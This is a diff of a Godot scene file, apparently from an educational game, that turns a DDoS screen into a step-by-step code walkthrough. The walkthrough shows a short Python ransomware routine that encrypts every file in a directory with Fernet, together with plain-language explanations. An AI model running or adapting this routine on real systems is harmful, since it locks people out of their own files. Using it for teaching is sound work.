@@ -1,825 +1,2112 @@
-[gd_scene load_steps=32 format=3 uid="uid://dug3problsltr"]
+[gd_scene load_steps=52 format=3 uid="uid://dn61e667662jc"]
 
-[ext_resource type="Script" uid="uid://clbhv2xkfpeam" path="res://Scenes/GUI/DDOS/ddos.gd" id="1_31y1v"]
-[ext_resource type="PackedScene" uid="uid://cnlake8o686ww" path="res://Scenes/GUI/CleanUI/icon.tscn" id="2_3unpp"]
-[ext_resource type="Texture2D" uid="uid://bn60eqphar820" path="res://Assets/Illustrator/sqlv2.png" id="3_dbxad"]
-[ext_resource type="Texture2D" uid="uid://igl7s83ahvyl" path="res://Assets/Illustrator/txtv2.png" id="4_txovr"]
-[ext_resource type="Texture2D" uid="uid://dic1btggpc3hd" path="res://Assets/Illustrator/browserv2.png" id="5_ucgyc"]
-[ext_resource type="Texture2D" uid="uid://cddfhvys55v1f" path="res://Assets/Illustrator/pythonv2.png" id="6_dg8a2"]
-[ext_resource type="Texture2D" uid="uid://dry2p2161qtif" path="res://Assets/Illustrator/WindowDarkNinePatch.png" id="7_ltnw7"]
-[ext_resource type="Script" uid="uid://btalbkmaah46c" path="res://Scripts/GUI/desktop.gd" id="8_x6qi4"]
-[ext_resource type="PackedScene" uid="uid://bcejk3vddejkh" path="res://Scenes/GUI/CleanUI/window.tscn" id="9_siykt"]
+[ext_resource type="Script" uid="uid://ckfxgu1kkib3k" path="res://Scripts/GUI/code_editor_ui.gd" id="1_fliea"]
+[ext_resource type="FontFile" uid="uid://bbhvwm260bx4g" path="res://Assets/Fonts/avantgarde_demi.ttf" id="2_5p0s0"]
+[ext_resource type="FontFile" uid="uid://c4mm3of2mc8o5" path="res://addons/phantom_camera/fonts/Nunito-Black.ttf" id="3_rwdno"]
+[ext_resource type="Script" uid="uid://dymocqk677j5n" path="res://Scripts/GUI/code_edit_window.gd" id="4_mk2dp"]
+[ext_resource type="PackedScene" uid="uid://cbqaj2456biy" path="res://Scenes/GUI/next_button.tscn" id="5_e0kck"]
+[ext_resource type="PackedScene" uid="uid://cfnlekhp378nk" path="res://Scenes/GUI/back_button.tscn" id="6_p3rr4"]
 
-[sub_resource type="Animation" id="Animation_shh12"]
-resource_name = "ddos_1"
-length = 3.0
+[sub_resource type="StyleBoxFlat" id="StyleBoxFlat_t4n35"]
+content_margin_left = 19.0
+bg_color = Color(0.11764706, 0.11764706, 0.1882353, 1)
 
-[sub_resource type="Animation" id="Animation_ucgyc"]
-resource_name = "ddos_10"
-
-[sub_resource type="Animation" id="Animation_dg8a2"]
-resource_name = "ddos_11"
-
-[sub_resource type="Animation" id="Animation_ltnw7"]
-resource_name = "ddos_12"
-
-[sub_resource type="Animation" id="Animation_x6qi4"]
-resource_name = "ddos_13"
-
-[sub_resource type="Animation" id="Animation_1pyr5"]
-resource_name = "ddos_2"
-
-[sub_resource type="Animation" id="Animation_x6d1q"]
-resource_name = "ddos_3"
-
-[sub_resource type="Animation" id="Animation_y56x2"]
-resource_name = "ddos_4"
-
-[sub_resource type="Animation" id="Animation_4d7ws"]
-resource_name = "ddos_5"
-
-[sub_resource type="Animation" id="Animation_crsjh"]
-resource_name = "ddos_6"
-
-[sub_resource type="Animation" id="Animation_3unpp"]
-resource_name = "ddos_7"
-
-[sub_resource type="Animation" id="Animation_dbxad"]
-resource_name = "ddos_8"
-
-[sub_resource type="Animation" id="Animation_txovr"]
-resource_name = "ddos_9"
-
-[sub_resource type="Animation" id="Animation_q8ro7"]
-resource_name = "start_of_ddos"
-
-[sub_resource type="AnimationLibrary" id="AnimationLibrary_3unpp"]
-_data = {
-&"ddos_1": SubResource("Animation_shh12"),
-&"ddos_10": SubResource("Animation_ucgyc"),
-&"ddos_11": SubResource("Animation_dg8a2"),
-&"ddos_12": SubResource("Animation_ltnw7"),
-&"ddos_13": SubResource("Animation_x6qi4"),
-&"ddos_2": SubResource("Animation_1pyr5"),
-&"ddos_3": SubResource("Animation_x6d1q"),
-&"ddos_4": SubResource("Animation_y56x2"),
-&"ddos_5": SubResource("Animation_4d7ws"),
-&"ddos_6": SubResource("Animation_crsjh"),
-&"ddos_7": SubResource("Animation_3unpp"),
-&"ddos_8": SubResource("Animation_dbxad"),
-&"ddos_9": SubResource("Animation_txovr"),
-&"start_of_ddos": SubResource("Animation_q8ro7")
-}
-
-[sub_resource type="StyleBoxFlat" id="StyleBoxFlat_0iv3o"]
-bg_color = Color(0.0862745, 0.152941, 0.188235, 1)
-border_width_left = 5
-border_width_top = 5
-border_width_right = 5
-border_width_bottom = 5
-border_color = Color(0.642386, 0.703609, 0.856338, 1)
+[sub_resource type="StyleBoxFlat" id="StyleBoxFlat_qmx2e"]
+content_margin_left = 10.0
+content_margin_right = 10.0
+bg_color = Color(0.11960501, 0.1159, 0.19, 1)
 corner_radius_top_left = 15
 corner_radius_top_right = 15
 corner_radius_bottom_right = 15
 corner_radius_bottom_left = 15
 
-[sub_resource type="StyleBoxFlat" id="StyleBoxFlat_31y1v"]
-bg_color = Color(0, 0.25098, 0.388235, 1)
+[sub_resource type="FontVariation" id="FontVariation_h8m8q"]
+base_font = ExtResource("3_rwdno")
 
-[sub_resource type="StyleBoxFlat" id="StyleBoxFlat_1pyr5"]
-bg_color = Color(0.0156863, 0.184314, 0.247059, 1)
-border_width_left = 2
-border_width_top = 2
-border_width_right = 2
-border_width_bottom = 2
+[sub_resource type="DPITexture" id="DPITexture_pkbn6"]
+_source = "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\"><path fill=\"none\" stroke=\"#b2b2b2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" stroke-opacity=\".45\" stroke-width=\"2\" d=\"m5 7 3 3 3-3\"/></svg>
+"
 
-[sub_resource type="StyleBoxFlat" id="StyleBoxFlat_x6d1q"]
-bg_color = Color(0, 0.25098, 0.388235, 1)
-border_width_left = 2
-border_width_top = 2
-border_width_right = 2
-border_width_bottom = 2
-border_color = Color(0.176471, 0.364706, 0.478431, 1)
+[sub_resource type="DPITexture" id="DPITexture_cxtjw"]
+_source = "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\"><path fill=\"none\" stroke=\"#b2b2b2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" stroke-opacity=\".45\" stroke-width=\"2\" d=\"m11.011063 9.9776246-3.0222094-2.9776246-2.9776247 3.02221\"/></svg>
+"
 
-[sub_resource type="StyleBoxFlat" id="StyleBoxFlat_y56x2"]
-bg_color = Color(0.0156863, 0.184314, 0.247059, 1)
-border_width_left = 2
-border_width_top = 2
-border_width_right = 2
-border_width_bottom = 2
+[sub_resource type="DPITexture" id="DPITexture_wf7ls"]
+_source = "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\"><path fill=\"none\" stroke=\"#b2b2b2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" stroke-opacity=\".45\" stroke-width=\"2\" d=\"m6 11 3-3-3-3\"/></svg>
+"
 
-[sub_resource type="StyleBoxFlat" id="StyleBoxFlat_4d7ws"]
-draw_center = false
+[sub_resource type="DPITexture" id="DPITexture_vuf0p"]
+_source = "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\"><path fill=\"none\" stroke=\"#b2b2b2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" stroke-opacity=\".45\" stroke-width=\"2\" d=\"m9 11-3-3 3-3\"/></svg>
+"
 
-[sub_resource type="StyleBoxFlat" id="StyleBoxFlat_crsjh"]
-bg_color = Color(0.6, 0.6, 0.6, 0)
+[sub_resource type="StyleBoxEmpty" id="StyleBoxEmpty_gu46y"]
 
-[node name="DDOS" type="MarginContainer" node_paths=PackedStringArray("animation")]
+[sub_resource type="StyleBoxEmpty" id="StyleBoxEmpty_oekl0"]
+
+[sub_resource type="StyleBoxEmpty" id="StyleBoxEmpty_i7g13"]
+
+[sub_resource type="StyleBoxEmpty" id="StyleBoxEmpty_k4s4l"]
+
+[sub_resource type="StyleBoxEmpty" id="StyleBoxEmpty_xwue7"]
+
+[sub_resource type="StyleBoxEmpty" id="StyleBoxEmpty_de0th"]
+
+[sub_resource type="FontVariation" id="FontVariation_31cwg"]
+base_font = ExtResource("3_rwdno")
+
+[sub_resource type="Theme" id="Theme_x5n46"]
+FoldableContainer/colors/collapsed_font_color = Color(1, 1, 1, 1)
+FoldableContainer/colors/font_color = Color(1, 1, 1, 1)
+FoldableContainer/colors/font_outline_color = Color(1, 1, 1, 1)
+FoldableContainer/colors/hover_font_color = Color(0.95, 0.95, 0.95, 1)
+FoldableContainer/constants/h_separation = 2
+FoldableContainer/constants/outline_size = 0
+FoldableContainer/font_sizes/font_size = 24
+FoldableContainer/fonts/font = SubResource("FontVariation_h8m8q")
+FoldableContainer/icons/expanded_arrow = SubResource("DPITexture_pkbn6")
+FoldableContainer/icons/expanded_arrow_mirrored = SubResource("DPITexture_cxtjw")
+FoldableContainer/icons/folded_arrow = SubResource("DPITexture_wf7ls")
+FoldableContainer/icons/folded_arrow_mirrored = SubResource("DPITexture_vuf0p")
+FoldableContainer/styles/focus = SubResource("StyleBoxEmpty_gu46y")
+FoldableContainer/styles/panel = SubResource("StyleBoxEmpty_oekl0")
+FoldableContainer/styles/title_collapsed_hover_panel = SubResource("StyleBoxEmpty_i7g13")
+FoldableContainer/styles/title_collapsed_panel = SubResource("StyleBoxEmpty_k4s4l")
+FoldableContainer/styles/title_hover_panel = SubResource("StyleBoxEmpty_xwue7")
+FoldableContainer/styles/title_panel = SubResource("StyleBoxEmpty_de0th")
+RichTextLabel/font_sizes/normal_font_size = 22
+RichTextLabel/fonts/normal_font = SubResource("FontVariation_31cwg")
+
+[sub_resource type="StyleBoxFlat" id="StyleBoxFlat_0dqkl"]
+bg_color = Color(0.11960501, 0.1159, 0.19, 1)
+corner_radius_top_left = 15
+corner_radius_top_right = 15
+corner_radius_bottom_right = 15
+corner_radius_bottom_left = 15
+
+[sub_resource type="StyleBoxEmpty" id="StyleBoxEmpty_qmx2e"]
+
+[sub_resource type="StyleBoxEmpty" id="StyleBoxEmpty_0tp54"]
+
+[sub_resource type="StyleBoxEmpty" id="StyleBoxEmpty_h8m8q"]
+
+[sub_resource type="StyleBoxEmpty" id="StyleBoxEmpty_pkbn6"]
+
+[sub_resource type="Shader" id="Shader_t2pxy"]
+code = "shader_type canvas_item;
+render_mode blend_mix, unshaded;
+
+// The full color of the rectangle
+uniform vec4 rect_color : source_color = vec4(1.0, 0.2, 0.2, 1.0); // red
+
+// Hole configuration
+uniform vec2 hole_position = vec2(0.0, 0.0); // Top-left corner of the hole (in pixels)
+uniform vec2 hole_size = vec2(50.0, 50.0);   // Width and height of the hole (square or rectangle)
+
+void fragment() {
+    // Convert UV to local pixel coordinates
+    vec2 pixel_pos = UV * vec2(textureSize(TEXTURE, 0));
+
+    // Check if we're inside the hole area
+    bool in_hole = pixel_pos.x > hole_position.x &&
+                   pixel_pos.x < hole_position.x + hole_size.x &&
+                   pixel_pos.y > hole_position.y &&
+                   pixel_pos.y < hole_position.y + hole_size.y;
+
+    if (in_hole) {
+        discard; // Make transparent
+    }
+
+    COLOR = rect_color;
+}
+"
+
+[sub_resource type="ShaderMaterial" id="ShaderMaterial_gu46y"]
+resource_local_to_scene = true
+shader = SubResource("Shader_t2pxy")
+shader_parameter/rect_color = Color(0, 0, 0, 0.505882)
+shader_parameter/hole_position = Vector2(0.135, 0.135)
+shader_parameter/hole_size = Vector2(3.025, 0.26)
+
+[sub_resource type="Animation" id="Animation_i7g13"]
+length = 0.001
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [""]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [""]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Creating an encryption code"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 0.135)]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.025, 0.26)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [0.0]
+}
+tracks/7/type = "value"
+tracks/7/imported = false
+tracks/7/enabled = true
+tracks/7/path = NodePath("WindowBackground/Window/WindowContents/MarginContainer/SampleContent:visible")
+tracks/7/interp = 1
+tracks/7/loop_wrap = true
+tracks/7/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/8/type = "value"
+tracks/8/imported = false
+tracks/8/enabled = true
+tracks/8/path = NodePath("WindowBackground/Window/WindowContents/WindowHeader/SampleHeader:text")
+tracks/8/interp = 1
+tracks/8/loop_wrap = true
+tracks/8/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Wow header"]
+}
+tracks/9/type = "value"
+tracks/9/imported = false
+tracks/9/enabled = true
+tracks/9/path = NodePath("WindowBackground/Window/WindowContents/MarginContainer/ProgressBar:value")
+tracks/9/interp = 1
+tracks/9/loop_wrap = true
+tracks/9/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [0.0]
+}
+tracks/10/type = "value"
+tracks/10/imported = false
+tracks/10/enabled = true
+tracks/10/path = NodePath("WindowBackground:visible")
+tracks/10/interp = 1
+tracks/10/loop_wrap = true
+tracks/10/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [false]
+}
+
+[sub_resource type="Animation" id="Animation_oekl0"]
+resource_name = "ransomware_step_01"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["First, the program imports two important tools: \"os\\\" 
+This lets the program interact with the computer’s files and folders. Think of it as a helper that can look inside directories, check whether something is a file, and manage paths."]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Importing the Tools"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 0.135)]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.025, 0.26)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [0.0]
+}
+
+[sub_resource type="Animation" id="Animation_k4s4l"]
+resource_name = "ransomware_step_02"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Fernet from cryptography -
+This is a secure encryption system. You can imagine it like a lock-and-key system: it can lock data (encrypt it) so nobody can read it, and later unlock it (decrypt it) using password key.
+"]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Importing the Tools"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 0.45)]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.025, 0.26)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [0.0]
+}
+
+[sub_resource type="Animation" id="Animation_xwue7"]
+resource_name = "ransomware_step_03"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["The program prepares a list of files to be encrypted: It starts with an empty list called \"allfiles."]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Collecting Files"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 1.07)]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.025, 0.26)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [0.0]
+}
+
+[sub_resource type="Animation" id="Animation_cxtjw"]
+resource_name = "ransomware_step_04"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Then, it looks through everything in the current directory using \"os.listdir()\"."]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Collecting Files"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 1.375)]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.025, 0.26)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [0.0]
+}
+
+[sub_resource type="Animation" id="Animation_wf7ls"]
+resource_name = "ransomware_step_05"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
